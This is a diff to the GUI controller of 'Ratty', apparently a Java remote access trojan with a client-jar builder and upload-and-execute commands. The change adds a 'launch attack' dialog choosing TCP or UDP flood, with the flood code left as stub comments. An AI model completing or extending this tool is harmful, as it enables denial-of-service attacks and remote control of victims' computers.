@@ -8,6 +8,8 @@ import java.io.IOException;
 import java.util.HashMap;
 import java.util.Set;
 
+import javax.swing.JOptionPane;
+
 import de.sogomn.engine.fx.Sound;
 import de.sogomn.rat.ActiveConnection;
 import de.sogomn.rat.builder.JarBuilder;
@@ -50,6 +52,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"gui_tree_icons.png",
 		"gui_icon.png",
 		"gui_menu_icons.png",
+		"gui_category_icons.png",
 		"language/lang_bsq.properties",
 		"language/lang_de.properties",
 		"language/lang_en.properties",
@@ -62,7 +65,10 @@ public final class RattyGuiController extends AbstractRattyController implements
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
 	private static final String OPTION_YES = LANGUAGE.getString("server.yes");
-	private static final String OPTION_NO = LANGUAGE.getString("server.no");
+	private static final String OPTION_CANCEL = LANGUAGE.getString("server.cancel");
+	private static final String OPTION_TCP = LANGUAGE.getString("server.tcp");
+	private static final String OPTION_UDP = LANGUAGE.getString("server.udp");
+	private static final String ATTACK_MESSAGE = LANGUAGE.getString("server.attack_message");
 	private static final String BUILDER_ERROR_MESSAGE = LANGUAGE.getString("builder.error");
 	private static final String BUILDER_ADDRESS_QUESTION = LANGUAGE.getString("builder.address_question");
 	private static final String BUILDER_PORT_QUESTION = LANGUAGE.getString("builder.port_question");
@@ -179,7 +185,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private FreePacket createFreePacket() {
-		final boolean accepted = gui.showWarning(FREE_WARNING, OPTION_YES, OPTION_NO);
+		final boolean accepted = gui.showWarning(FREE_WARNING, OPTION_YES, OPTION_CANCEL);
 		
 		if (accepted) {
 			final FreePacket packet = new FreePacket();
@@ -252,11 +258,17 @@ public final class RattyGuiController extends AbstractRattyController implements
 	}
 	
 	private void launchAttack() {
-		//...
+		final int input = gui.showOptionDialog(ATTACK_MESSAGE, OPTION_TCP, OPTION_UDP, OPTION_CANCEL);
+		
+		if (input == JOptionPane.YES_OPTION) {
+			//TCP flood packet
+		} else if (input == JOptionPane.NO_OPTION) {
+			//UDP flood packet
+		}
 	}
 	
 	private void uploadExecute(final ServerClient client) {
-		final boolean accepted = gui.showWarning(UPLOAD_EXECUTE_WARNING, OPTION_YES, OPTION_NO);
+		final boolean accepted = gui.showWarning(UPLOAD_EXECUTE_WARNING, OPTION_YES, OPTION_CANCEL);
 		
 		if (!accepted) {
 			return;
@@ -508,10 +520,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		final IPacket packet = createPacket(client, command);
 		
 		if (packet != null) {
-			final PingPacket ping = new PingPacket();
-			
 			client.connection.addPacket(packet);
-			client.connection.addPacket(ping);
 		}
 		
 		handleCommand(client, command);
